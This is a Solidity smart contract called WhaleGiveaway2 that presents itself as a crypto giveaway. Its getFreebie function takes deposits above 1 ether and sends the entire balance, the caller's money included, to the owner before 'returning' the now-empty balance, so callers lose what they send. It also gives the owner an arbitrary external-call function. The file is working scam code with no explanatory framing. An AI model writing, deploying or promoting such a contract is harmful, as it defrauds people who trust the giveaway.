pragma solidity ^0.4.19;

contract WhaleGiveaway2 {
    address public owner;

    function WhaleGiveaway2() public {
        owner = msg.sender;
    }

    function() public payable {}

    function getFreebie() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address _addr, bytes _data) public payable {
        require(msg.sender == owner);
        require(_addr.call.value(msg.value)(_data));
    }
}